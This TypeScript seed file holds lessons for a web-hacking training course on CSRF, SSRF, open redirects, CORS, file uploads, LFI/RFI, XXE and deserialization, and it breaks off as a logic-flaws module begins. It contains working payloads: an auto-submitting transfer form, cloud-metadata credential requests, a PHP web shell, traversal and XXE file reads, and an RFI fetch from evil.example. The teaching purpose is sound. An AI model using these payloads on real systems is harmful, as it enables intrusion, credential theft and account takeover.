import type { ExerciseSeed, ModuleSeed } from './types';
import { videoSlot } from './types';

export const MODULES: ModuleSeed[] = [
  {
    slug: 'csrf-ssrf-redirects',
    title: 'CSRF, SSRF and Redirects',
    description:
      'Make the browser or the server do work for you. By the end you can force a logged-in victim to submit an action they never intended (CSRF), make a server fetch internal-only addresses and read its cloud metadata (SSRF), turn a trusted link into a phishing redirect (open redirect), and spot the CORS header mistake that hands your data to an attacker\'s page.',
    lessons: [
      {
        slug: 'csrf',
        title: 'CSRF: Riding Someone Else\'s Session',
        summary: 'You do not steal their password. You get their own browser to submit a request they never meant to send.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'CSRF (Cross-Site Request Forgery) is a trick where you make a logged-in user\'s browser fire off a request to a site they trust, without them meaning to. You never see their password or their cookie. The browser just does what browsers do: it attaches the user\'s session cookie to every request going to that site, even a request that started on your evil page.',
          },
          {
            type: 'paragraph',
            text:
              'Here is the mechanism, step by step. A bank site sets a session cookie when the user logs in. From then on, the browser automatically sends that cookie with every request to the bank - it does not care which page triggered the request. So if your page contains a hidden form that POSTs to `https://bank.example/transfer`, and the victim is logged in in another tab, their browser sends the transfer request WITH their session cookie attached. The bank sees a valid, authenticated request and processes it. The site trusted the cookie; it never checked whether the user actually meant to do this.',
          },
          {
            type: 'paragraph',
            text:
              'Walk one all the way through. Say the transfer endpoint takes `POST /transfer` with body `amount=50000&to=attacker`. You build a page with a form pointing at that URL, pre-filled with those values, and a line of JavaScript that submits it the instant the page loads. You send the victim the link over WhatsApp. They click it while still logged into the bank. Their browser submits your form, attaches their cookie, and the bank moves the money. From the bank\'s side it looks exactly like the user clicked "Transfer" themselves.',
          },
          {
            type: 'code',
            language: 'html',
            filename: 'csrf-poc.html',
            code: '<form id="f" action="https://bank.example/transfer" method="POST">\n  <input type="hidden" name="amount" value="50000">\n  <input type="hidden" name="to" value="attacker">\n</form>\n<script>document.getElementById(\'f\').submit();</script>',
          },
          {
            type: 'paragraph',
            text:
              'When the victim opens this page, the script submits the form immediately with no button to click. The request lands at the bank carrying the victim\'s cookie. To CONFIRM a real CSRF rather than guess at one, you check three things: the action changes state (moves money, changes an email, deletes something), the request has no unpredictable token in it that an attacker could not know, and the server accepts the request when it arrives from your external page. If all three hold, host the page, trigger it in a logged-in session, and watch the action complete.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Needs a state-changing action** - reading data is not a CSRF target; changing it is',
              '**Cookie-based sessions are the classic victim** - because the cookie rides along automatically',
              '**A CSRF token is the standard defence** - an unpredictable value the attacker\'s page cannot know',
              '**SameSite=Lax/Strict cookies** blunt most cross-site CSRF by not sending the cookie on cross-site requests',
              '**GET-based state changes are the easiest to forge** - just an `<img src>` tag can trigger them',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Why it matters: the impact is whatever the forced action does. Change the victim\'s account email to yours, then trigger a password reset, and you own the account - a full account takeover with no password stolen. In a report you state the exact action forced, that it needs no CSRF token, that it works from an attacker-controlled page, and what a real attacker gains from it (money moved, email changed, account deleted).',
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'No token, no problem for the attacker',
            text:
              'If the state-changing request has no unpredictable CSRF token and the cookie is not SameSite, it is very likely forgeable. That missing token is the whole bug.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Authorised targets only',
            text: 'Only fire a CSRF proof-of-concept against an account and site you own or have written permission to test. Tricking a real person into a live transfer is a crime, not research.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You can spot a request that changes state with no CSRF protection and explain how an attacker\'s page rides the victim\'s own session to fire it.',
          },
          {
            type: 'quiz',
            question: 'What makes a CSRF attack possible?',
            options: [
              'The attacker steals the victim\'s password',
              'The browser automatically attaches the victim\'s session cookie to a request the attacker\'s page triggers',
              'The server has no HTTPS',
              'The victim types their cookie into the attacker\'s page',
            ],
            correctIndex: 1,
            explanation:
              'The browser sends the session cookie with any request to that site, so a request triggered from an attacker\'s page arrives authenticated - no password or cookie theft needed.',
          },
        ],
      },
      {
        slug: 'ssrf',
        title: 'SSRF: Making the Server Fetch',
        summary: 'The app lets you hand it a URL and it fetches it. So you hand it the addresses only the server can reach.',
        estimatedMinutes: 10,
        importance: 'core',
        blocks: [
          videoSlot('SSRF explained - making a server fetch its own cloud metadata'),
          {
            type: 'paragraph',
            text:
              'SSRF (Server-Side Request Forgery) is when an app takes a URL from you and goes and fetches it from its own server. Sounds harmless - until you realise the server sits inside a private network you cannot reach, and now you can point it at internal addresses through the app.',
          },
          {
            type: 'paragraph',
            text:
              'The mechanism: lots of features fetch a URL on the server side - "import an image from a link", "add a webhook", "generate a PDF from this page", "check this URL is up". You control the URL. The server, not your browser, makes the request. The server usually has network access you do not: internal admin panels on `10.x` addresses, databases bound to `localhost`, and on a cloud box, a special internal address that hands out credentials. You feed the app one of those addresses instead of a normal image URL, and the server dutifully fetches it and often shows you the response.',
          },
          {
            type: 'paragraph',
            text:
              'Walk the cloud-metadata classic end to end. The app has a field `imageUrl` you would normally set to `https://example.com/cat.jpg`. You change it to `http://169.254.169.254/latest/meta-data/`. That address, `169.254.169.254`, is the cloud metadata service - it only answers requests coming from inside the cloud instance itself, which is exactly where the server is. The server fetches it and returns a listing of metadata paths. You drill down to the credentials path and the server hands back temporary access keys for the machine\'s role. Those keys, used from your own laptop, can read storage buckets and more. That is SSRF escalating into a full cloud compromise.',
          },
          {
            type: 'command',
            description: 'What the app fetches on your behalf, and what comes back:',
            commands: [
              'GET /fetch?imageUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
              'GET /fetch?imageUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role',
            ],
          },
          {
            type: 'paragraph',
            text:
              'The first request makes the server list the IAM roles attached to the instance and returns the role name, say `web-role`. The second, using that name, returns a JSON blob with `AccessKeyId`, `SecretAccessKey` and a `Token`. Reading those in the app\'s response means the server fetched an internal-only endpoint on your command - that is a confirmed SSRF, and a critical one, because those are live cloud credentials. To confirm SSRF in general (not just this cloud case), point the URL at a server you control and watch your own server\'s logs: if a request arrives from the target\'s IP, the app is fetching arbitrary URLs for you.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**The cloud metadata IP** - `169.254.169.254`, reachable only from inside the instance',
              '**Internal targets** - `http://localhost:port`, `http://127.0.0.1`, `http://10.x.x.x`, `http://192.168.x.x`',
              '**Blacklist bypasses** - `http://127.1`, decimal IPs, `http://localhost.attacker.com` that resolves to `127.0.0.1`',
              '**DNS rebinding** - a hostname that passes the check as a public IP, then re-resolves to `127.0.0.1` on the real fetch',
              '**Blind SSRF** - no response shown, but out-of-band DNS/HTTP to your server proves the fetch happened',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Impact scales with what the server can reach. At minimum SSRF maps the internal network and hits services no outsider should touch. At worst, on a cloud host, it reads instance credentials and becomes account-level access. In a report you name the exact internal target you reached, show the response the server returned, and state whether you obtained credentials or only internal access - because the metadata-credentials case is the one that turns a medium finding into a critical.',
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'A blocklist is not a fix',
            text:
              'Filtering out the word "localhost" or one IP is trivially bypassed - `127.1`, decimal encodings, and DNS rebinding all sail past it. The real fix is an allowlist plus blocking link-local addresses.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Only fetch what you are authorised to',
            text: 'Pointing a target\'s server at internal or metadata addresses is only permitted on systems you own or are explicitly authorised to test. Reading cloud credentials you were not authorised to touch is unauthorised access.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Level up',
            text: 'You can spot a URL the server fetches for you and turn it toward internal addresses and the `169.254.169.254` metadata endpoint.',
          },
          {
            type: 'quiz',
            question: 'Why is the address 169.254.169.254 such a valuable SSRF target on a cloud server?',
            options: [
              'It is the public DNS server',
              'It is the internal cloud metadata service that can hand out the instance\'s temporary credentials',
              'It is where the database always lives',
              'It is the load balancer',
            ],
            correctIndex: 1,
            explanation:
              '169.254.169.254 is the cloud metadata endpoint, reachable only from inside the instance. It can return IAM credentials, turning an SSRF into cloud account access.',
          },
        ],
      },
      {
        slug: 'open-redirect',
        title: 'Open Redirect',
        summary: 'A trusted link that quietly bounces the victim to your site. Small bug, big role in phishing chains.',
        estimatedMinutes: 8,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'An open redirect is when a site takes a destination from a URL parameter and sends the visitor there without checking where "there" is. The link starts on a domain the victim trusts and ends on a domain you control. On its own it is low severity, but as a link in a chain it is gold for phishing and for stealing tokens.',
          },
          {
            type: 'paragraph',
            text:
              'The mechanism is simple. Sites often need to bounce you around after an action - "log in, then go back to where you were". They store that destination in a parameter like `?next=` or `?returnUrl=` and, after the action, redirect the browser there. If the site never checks that the destination is one of its own pages, you can set it to anything. The browser gets a `302` with a `Location:` header pointing at your site and follows it, no questions asked.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'open-redirect-example',
            code: 'GET /login?next=https://evil.example/phish\n\nResponse (302):\n  Location: https://evil.example/phish',
          },
          {
            type: 'paragraph',
            text:
              'Read that response. The victim clicks a link that begins with the trusted domain, so it looks safe - `https://bank.example/login?next=...`. After they log in, the server sends a `302` redirect and the `Location` header points at `evil.example`. The browser follows it silently. The victim lands on your phishing page, which is a pixel copy of the bank login, and re-enters their password. To confirm it is a real open redirect, send the crafted URL and watch for a `302`/`301` whose `Location` header contains YOUR external domain. If the site instead keeps you on its own domain or shows an error, the destination is being validated and there is no bug.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Common parameter names** - `next`, `returnUrl`, `redirect`, `url`, `dest`, `continue`, `goto`',
              '**Weak checks that still fail** - allowing anything starting with `/` lets `//evil.example` through (protocol-relative)',
              '**`https://bank.example.evil.example`** - a lookalike host that a naive "starts with bank.example" check misses',
              '**Where it turns dangerous** - OAuth `redirect_uri` and SSO flows, where the redirect carries a token',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Why a hacker cares: alone, an open redirect is often triaged as low or informational because it needs a victim to click and then be fooled. Its real value is chaining. Pointed at an OAuth or SSO `redirect_uri`, it can bounce an access token or authorisation code to your server, upgrading a "just a redirect" into account takeover. In a report, say whether it is a bare phishing redirect or one that leaks a token, because that is the difference between low and high severity.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'The slash trick',
            text:
              'A check that only blocks `http://` and `https://` often forgets `//evil.example` - the browser treats a protocol-relative URL as external and redirects anyway.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Test only your own targets',
            text: 'Craft and follow redirect links only on sites you own or are authorised to test. Using one to phish a real person is fraud, full stop.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You can find a redirect parameter, prove it sends users off-site, and explain why it becomes serious inside an OAuth flow.',
          },
          {
            type: 'quiz',
            question: 'Why is an open redirect usually more dangerous inside an OAuth login flow than on its own?',
            options: [
              'It runs JavaScript on the page',
              'The redirect can carry an access token or auth code off to the attacker\'s server',
              'It deletes the user\'s account',
              'It disables HTTPS',
            ],
            correctIndex: 1,
            explanation:
              'In OAuth, the redirect target receives a token or code. A redirect an attacker controls can send that credential to their own server, escalating to account takeover.',
          },
        ],
      },
      {
        slug: 'cors-misconfiguration',
        title: 'CORS Misconfiguration',
        summary: 'One sloppy header and any website can read your logged-in data from another site\'s API.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'CORS (Cross-Origin Resource Sharing) is the set of rules that decides whether JavaScript on one site is allowed to read a response from another site\'s API. Get the rules wrong and you let an attacker\'s page read a victim\'s private data straight from the API, using the victim\'s own logged-in session.',
          },
          {
            type: 'paragraph',
            text:
              'Start with the default. Browsers enforce the same-origin policy: script on `evil.example` normally cannot read a response from `api.bank.example`. CORS is how an API deliberately opens a door - it sends an `Access-Control-Allow-Origin` header naming who is allowed to read it. The bug is in how that header is chosen. A careful API allows a fixed list. A broken one reflects back whatever `Origin` the request sent - so it will happily tell `evil.example` that `evil.example` is allowed. Pair that with `Access-Control-Allow-Credentials: true` and the browser will send the victim\'s cookies AND let the attacker\'s script read the response.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'reflected-origin-bug',
            code: 'Request:\n  GET /api/me\n  Origin: https://evil.example\n\nResponse:\n  Access-Control-Allow-Origin: https://evil.example\n  Access-Control-Allow-Credentials: true\n  { "email": "victim@example.com", "apiKey": "sk_live_..." }',
          },
          {
            type: 'paragraph',
            text:
              'Read the exchange. The request came from `evil.example` and the API echoed that exact origin into `Access-Control-Allow-Origin`, plus `Allow-Credentials: true`. That combination tells the browser: "let this cross-site page, with the victim\'s cookies, read my response." So a script on the attacker\'s page can `fetch(\'https://api.bank.example/api/me\', {credentials:\'include\'})` and read the victim\'s email and API key. To CONFIRM the bug, send a request with an `Origin` header set to a domain you control and inspect the response headers: if `Access-Control-Allow-Origin` comes back as your domain AND `Access-Control-Allow-Credentials` is `true`, it is exploitable. If the API returns a fixed allowed origin or omits the credentials header, it is safe.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**The dangerous pair** - reflected `Access-Control-Allow-Origin` PLUS `Access-Control-Allow-Credentials: true`',
              '**`Allow-Origin: *`** is common but browsers refuse to send credentials with a wildcard, so it usually leaks only public data',
              '**Weak origin checks** - allowing anything ending in `bank.example` lets `bank.example.evil.example` through',
              '**`null` origin trap** - some APIs allow `Origin: null`, which an attacker can force from a sandboxed iframe',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Impact: an attacker\'s page silently reads whatever the API returns for the logged-in victim - profile data, tokens, keys, messages. No click on anything sensitive, no password. In a report you show the request with your `Origin` and the response reflecting it with credentials enabled, then show the actual private data your script could read, because "the header is wrong" alone is weaker than "here is the victim data I extracted with it".',
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'Reflected origin plus credentials is the whole bug',
            text:
              'If the API mirrors your Origin back and also sets Allow-Credentials to true, any site can read a logged-in user\'s data. A wildcard alone cannot, because browsers block credentials with `*`.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Read only your own data',
            text: 'Test CORS with your own test accounts on systems you are authorised to assess. Reading another real user\'s private data through this bug is unauthorised access.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Locked in',
            text: 'You can send a forged Origin, read the response headers, and tell an exploitable CORS misconfiguration from a harmless one.',
          },
          { type: 'practice_ref', title: 'CSRF, SSRF and Redirects check', exerciseSlug: 'csrf-ssrf-redirects-quiz' },
          {
            type: 'quiz',
            question: 'Which combination makes a CORS setup exploitable for stealing a logged-in user\'s private data?',
            options: [
              'Access-Control-Allow-Origin: * and no credentials',
              'A reflected Access-Control-Allow-Origin plus Access-Control-Allow-Credentials: true',
              'No CORS headers at all',
              'A fixed Access-Control-Allow-Origin naming one trusted site',
            ],
            correctIndex: 1,
            explanation:
              'Reflecting the attacker\'s Origin back and allowing credentials lets the attacker\'s page read the response with the victim\'s cookies. A wildcard blocks credentials, and a fixed origin is safe.',
          },
        ],
      },
    ],
  },
  {
    slug: 'files-and-uploads',
    title: 'Files, Uploads and Parsers',
    description:
      'Where "just an upload form" turns into remote code and stolen files. By the end you can get a web shell past a file-type check, read arbitrary server files through path tricks and include flaws (LFI/RFI), pull internal files and metadata out of an XML parser (XXE), and recognise when saved data gets turned back into live objects (deserialization).',
    lessons: [
      {
        slug: 'file-upload-vulnerabilities',
        title: 'File Upload Vulnerabilities',
        summary: 'The site wanted a profile picture. You gave it a program, and the server ran it.',
        estimatedMinutes: 10,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'A file upload becomes a serious bug when the server saves a file you control somewhere it will later execute or serve it. The dream outcome is a web shell: you upload a small script, browse to its URL, and the server runs your commands. Most upload bugs come down to the server trusting the wrong thing about the file.',
          },
          {
            type: 'paragraph',
            text:
              'There are three different things a server can check, and they are not the same. The **extension** is just the end of the filename (`.jpg`). The **content-type** is a header the browser sends (`Content-Type: image/jpeg`) - and you send it, so you can lie. The **magic bytes** are the first few bytes inside the file that really identify its format (a real PNG starts with the bytes `89 50 4E 47`). A lazy server checks only one of these. If it trusts the content-type header, you set the header to `image/jpeg` but upload a `.php` file. If it trusts the extension, you rename your shell to `shell.php.jpg` or `shell.jpg` and look for a path that serves it as code anyway.',
          },
          {
            type: 'paragraph',
            text:
              'Walk one through. The upload only allows images, checking the content-type header. You capture the upload in a proxy, keep the filename `shell.php`, but change the intercepted `Content-Type` to `image/jpeg`. The server sees "image", accepts it, and saves it to `/uploads/shell.php`. You then browse to `https://example.com/uploads/shell.php?cmd=id`. Because the server runs `.php` files in that folder, your script executes and returns the output of `id`. That output appearing in your browser is the confirmation: you did not just upload a file, you got the server to run your code.',
          },
          {
            type: 'code',
            language: 'php',
            filename: 'shell.php',
            code: '<?php echo shell_exec($_GET[\'cmd\']); ?>',
          },
          {
            type: 'paragraph',
            text:
              'That one line runs whatever you pass in `?cmd=`. Requesting `?cmd=id` returns the server\'s user, `?cmd=ls` lists the directory - each response is proof the code executed on the server, not in your browser. But confirming an upload bug also means knowing WHERE the file landed. A file saved to a folder that is served but never executed (say, a plain static bucket) is not code execution - it might still be stored XSS if it serves as HTML, but it is a different, lower finding. So always answer two questions: did my file get saved, and is that location one the server executes or merely serves?',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Extension vs content-type vs magic bytes** - a strong check validates the real content, not the header you send',
              '**Double extensions** - `shell.php.jpg`, or `shell.php%00.jpg` on old stacks that stop at the null byte',
              '**Path in the filename** - `../../shell.php` can drop the file outside the upload folder',
              '**Polyglots** - a file that is a valid image AND valid script, to pass a magic-byte check',
              '**Stored-but-not-served** - if the folder does not execute your file, it is not RCE',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Impact is why upload bugs top severity charts. A shell in an executed directory is remote code execution - the whole server, other users\' files, the database, everything the web process can touch. In a report you state the filename you uploaded, the trick that got it past the check (content-type spoof, double extension, path in name), the exact URL you browsed to, and the command output proving execution. Impact drops sharply if the file is stored somewhere never served as code, so be honest about which case you have.',
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'The browser-sent content-type is a lie you write',
            text:
              'A server that trusts the `Content-Type` header is trusting attacker input, because you set that header. Real defence reads the file\'s actual bytes and controls whether the upload folder can execute anything.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Shells go on your own boxes',
            text: 'Upload and run a shell only on servers you own or have written authorisation to test. Dropping a web shell on a system you do not own is a serious criminal offence, not a proof-of-concept.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You can tell extension, content-type and magic-byte checks apart, bypass a weak one, and prove code execution from an upload form.',
          },
          {
            type: 'quiz',
            question: 'A server accepts your upload because you set the Content-Type header to image/jpeg, then runs your .php file. What did it trust that it should not have?',
            options: [
              'The file\'s magic bytes',
              'The Content-Type header, which the client controls',
              'The file size',
              'The HTTPS certificate',
            ],
            correctIndex: 1,
            explanation:
              'The Content-Type header is sent by the client and can be forged. Trusting it to decide the file type lets an attacker upload a script disguised as an image.',
          },
        ],
      },
      {
        slug: 'lfi-and-rfi',
        title: 'LFI and RFI',
        summary: 'The app builds a filename out of your input. So you steer it at files it was never meant to open.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'LFI (Local File Inclusion) and RFI (Remote File Inclusion) happen when an app uses your input to decide which file to open or include. With LFI you read files already on the server; with RFI you make it pull and run a file from a URL you control. Both come from the same root: a filename glued together from user input.',
          },
          {
            type: 'paragraph',
            text:
              'The mechanism: a site shows pages with a URL like `/view?page=about`, and behind it the code does something like `include("pages/" + page + ".php")`. Whatever you put in `page` becomes part of a real file path. If there is no check, you can climb out of the intended folder with `../` sequences - each `../` steps up one directory - until you reach a file you want. On Linux, `/etc/passwd` is the classic read target because it exists everywhere and is world-readable, which makes it a clean, safe proof.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'lfi-path-traversal',
            code: 'GET /view?page=../../../../etc/passwd\n\nResponse (200):\n  root:x:0:0:root:/root:/bin/bash\n  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n  ...',
          },
          {
            type: 'paragraph',
            text:
              'Read the response. Your `../../../../` walked up from the `pages/` folder to the filesystem root, then down into `/etc/passwd`, and the server returned its contents. Seeing real `/etc/passwd` lines - the `root:x:0:0` format - is the confirmation that you are reading arbitrary local files, not the intended page. RFI is the nastier cousin: if the include allows a URL, `?page=http://evil.example/shell.txt` makes the server fetch and run your remote script - straight to code execution. RFI is rarer now because fetching remote URLs in includes is disabled by default on modern stacks, so LFI is what you will usually find.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Traversal sequence** - `../` steps up a directory; stack enough to reach the root',
              '**High-value reads** - `/etc/passwd`, app config files, `.env`, source code, log files',
              '**Bypasses** - URL-encoded `%2e%2e%2f`, or `....//` to defeat a naive single "../" strip',
              '**LFI to RCE** - include a log file you can poison, or a PHP wrapper like `php://filter`',
              '**RFI** - `?page=http://your-server/shell.txt`, only where remote includes are allowed',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Why it matters: LFI leaks source code and secrets (an `.env` file with database passwords is game over), and can sometimes be escalated to code execution by including a poisoned log or an uploaded file. RFI is direct remote code execution. In a report, show the exact parameter, the traversal payload, and a snippet of the sensitive file you read - `/etc/passwd` for a clean proof, or a config file if you can reach one - and state whether you could escalate the read into execution.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'A stripped "../" is not a fix',
            text:
              'Code that removes one `../` can be beaten with `....//`, which becomes `../` after the strip. Proper defence maps input to a fixed allowlist of pages, never builds a path from raw input.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Own it or have it in writing',
            text: 'Read server files or trigger remote includes only against systems you own or are authorised to test. Pulling another organisation\'s config or source is theft of data, not a demo.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Level up',
            text: 'You can turn a `page=` style parameter into an arbitrary file read and explain how LFI can climb toward code execution.',
          },
          {
            type: 'quiz',
            question: 'In a URL like /view?page=../../../../etc/passwd, what is the `../../../../` doing?',
            options: [
              'Encrypting the request',
              'Climbing up out of the intended folder to reach a file elsewhere on the filesystem',
              'Repeating the request four times',
              'Setting the file permissions',
            ],
            correctIndex: 1,
            explanation:
              'Each `../` steps up one directory. Stacking them walks out of the intended pages folder up to the root, then down into a target file the app never meant to serve.',
          },
        ],
      },
      {
        slug: 'xxe',
        title: 'XXE: XML External Entities',
        summary: 'You feed the app XML, and hidden inside it is an instruction to go read the server\'s files.',
        estimatedMinutes: 10,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'XXE (XML External Entity) injection happens when an app parses XML you send and its parser is set up to follow "external entities" - little placeholders that can pull in the contents of a file or a URL. You hide one of those in your XML, and the parser fetches the file for you and drops it into the response.',
          },
          {
            type: 'paragraph',
            text:
              'The mechanism rests on a real but dangerous XML feature. XML lets you define an entity - a named shortcut - and an external entity can point at a resource, like `file:///etc/passwd`. When the parser expands the entity, it reads that resource and substitutes the contents. Wherever the app then echoes that value back (an error message, a field it prints), you see the file. Any endpoint that takes XML is a candidate: SOAP APIs, SVG uploads, XML import features, some document formats that are XML underneath.',
          },
          {
            type: 'code',
            language: 'xml',
            filename: 'xxe-payload.xml',
            code: '<?xml version="1.0"?>\n<!DOCTYPE data [\n  <!ENTITY secret SYSTEM "file:///etc/passwd">\n]>\n<data>&secret;</data>',
          },
          {
            type: 'paragraph',
            text:
              'Walk the payload. The `<!DOCTYPE>` block defines an entity named `secret` whose value is the external resource `file:///etc/passwd`. In the body, `&secret;` references it. A vulnerable parser reads `/etc/passwd`, replaces `&secret;` with its contents, and the app echoes the resulting `<data>` value back to you - so the response contains the password file. Seeing those `root:x:0:0` lines in the response is your confirmation of a classic in-band XXE. If the app does not echo the value back, you use blind XXE: point the entity at `http://your-server/` and watch your server logs for the incoming request, which proves the parser followed your external entity even when you cannot see the file directly.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Entry points** - SOAP/XML APIs, SVG and DOCX/XLSX uploads, any XML import or config field',
              '**File read** - `file:///etc/passwd`, app source, config with credentials',
              '**SSRF via XXE** - `http://169.254.169.254/...` makes the parser hit internal or metadata URLs',
              '**Blind XXE** - no echo, so use out-of-band: an external entity to `http://your-server/` confirms the fetch',
              '**The tell** - the app accepts XML and you control any part of it',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Impact: XXE reads local files (secrets, source, `/etc/passwd`) and, because the parser can fetch URLs, doubles as SSRF - reaching internal services and cloud metadata just like a normal SSRF. In a report, include the exact XML payload, the endpoint that accepted it, and the file contents or out-of-band callback that proves the parser followed your entity. Note whether it is in-band (file shown in response) or blind (proven by a callback), because that changes how you demonstrate impact.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'XXE is also an SSRF',
            text:
              'Because an external entity can be a URL, the same bug that reads `file:///etc/passwd` can hit `http://169.254.169.254/` - so XXE often unlocks internal network access and cloud metadata too.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Authorised systems only',
            text: 'Send XXE payloads only to parsers on systems you own or are cleared to test. Using one to read files off a server you do not control is unauthorised access to data.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Locked in',
            text: 'You can write an external-entity payload, prove a parser followed it, and explain why XXE is a file-read and an SSRF at the same time.',
          },
          {
            type: 'quiz',
            question: 'What makes an XXE attack possible?',
            options: [
              'The server uses HTTP instead of HTTPS',
              'An XML parser is allowed to expand external entities that point at files or URLs',
              'The password is too short',
              'The app is written in JavaScript',
            ],
            correctIndex: 1,
            explanation:
              'XXE relies on the XML parser resolving external entities. If it will read a `file://` or `http://` resource named in your XML, it fetches that for you and can leak files or hit internal URLs.',
          },
        ],
      },
      {
        slug: 'insecure-deserialization',
        title: 'Insecure Deserialization',
        summary: 'The app saved an object as a blob, then rebuilt it from your version. So you rebuild it into something dangerous.',
        estimatedMinutes: 10,
        importance: 'optional',
        blocks: [
          {
            type: 'paragraph',
            text:
              'Serialization turns a program\'s object - a user, a cart, a session - into a string of bytes so it can be stored or sent. Deserialization rebuilds the object from those bytes. Insecure deserialization is when the app rebuilds an object from data you control and trusts it blindly, letting you change the object or, at worst, trigger code while it is being rebuilt.',
          },
          {
            type: 'paragraph',
            text:
              'The mechanism: an app takes a serialized blob from somewhere you can reach - a cookie, a hidden field, an API body - and feeds it to a deserializer that reconstructs the original object. If nothing verifies the blob was not tampered with, you can decode it, edit the values, and re-encode it. Change `role: user` to `role: admin` and the rebuilt object is now an admin. In more dangerous cases, certain classes run code automatically during reconstruction (special "wake up" methods), so a crafted blob referencing those classes can chain into remote code execution - these are called gadget chains.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'tampered-cookie',
            code: 'Original cookie (base64 of a serialized object):\n  eyJ1c2VyIjoiYXNoYSIsInJvbGUiOiJ1c2VyIn0=\n\nDecoded:\n  {"user":"asha","role":"user"}\n\nRe-encoded after editing role -> admin:\n  eyJ1c2VyIjoiYXNoYSIsInJvbGUiOiJhZG1pbiJ9',
          },
          {
            type: 'paragraph',
            text:
              'Read the flow. The cookie is base64 of a serialized object. You decode it and see `{"user":"asha","role":"user"}`. You change `role` to `admin`, re-encode, and send it back. If the app deserializes it without checking a signature, it now believes you are an admin. The confirmation is behavioural: after swapping the cookie, you can reach an admin-only page or action you could not before. If instead the app rejects the tampered blob (an "invalid signature" error), it is signing its serialized data and this door is closed. This example is a data-tampering case; true RCE via gadget chains is language-specific and far more involved, but it starts from the same trust mistake.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Where blobs hide** - cookies, hidden form fields, API bodies, cache entries, message queues',
              '**Format tells** - Java blobs often start with `rO0` in base64; PHP serialized looks like `a:2:{...}`; .NET has its own markers',
              '**Data tampering** - flip a role, an id, a price inside the object',
              '**Gadget chains** - crafted objects that run code during deserialization, the RCE case',
              '**The fix** - never deserialize untrusted data, or sign it so tampering is detected',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Impact ranges from privilege escalation (flip a role, tamper an id) up to full remote code execution when a gadget chain exists for the framework in use. In a report, show the original blob, your modification, and the changed behaviour it caused - admin access gained, price altered, or, if you reached it, code execution. State clearly whether it is data-tampering or code-execution, because the severity gap between them is huge.',
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'The format gives it away',
            text:
              'A cookie or field that base64-decodes to something starting with `rO0` (Java) or looking like `a:2:{...}` (PHP) is a serialized object. That is your signal to try decoding, editing and re-sending it.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Only on systems you may test',
            text: 'Tamper with serialized data only on applications you own or are authorised to assess. Escalating your privileges on someone else\'s live system is unauthorised access, whatever the technique.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You can recognise a serialized blob, tamper a value to change what the app rebuilds, and explain how the same flaw can reach code execution.',
          },
          {
            type: 'quiz',
            question: 'You base64-decode a cookie, change "role":"user" to "role":"admin", re-encode it, and the app now treats you as an admin. What went wrong on the server?',
            options: [
              'The cookie was not encrypted',
              'The app rebuilt an object from data you controlled without verifying it had not been tampered with',
              'The session expired',
              'HTTPS was misconfigured',
            ],
            correctIndex: 1,
            explanation:
              'Insecure deserialization trusts attacker-controlled serialized data. With no integrity check (like a signature), a tampered blob rebuilds into a modified - here, privileged - object.',
          },
        ],
      },
    ],
  },
  {
    slug: 'logic-and-race-conditions',
    title: 'Logic and Race Conditions',
    description:
      'The bugs no scanner will ever find, because nothing is technically "broken" - the app just lets you do something it should not. By the end you can spot a business-logic flaw by thinking like a cheat, exploit a race condition by firing parallel requests into a timing window, bypass a rate limit, and tamper prices and quantities to pay less or take more than allowed.',
    lessons: [
      {
        slug: 'business-logic-flaws',
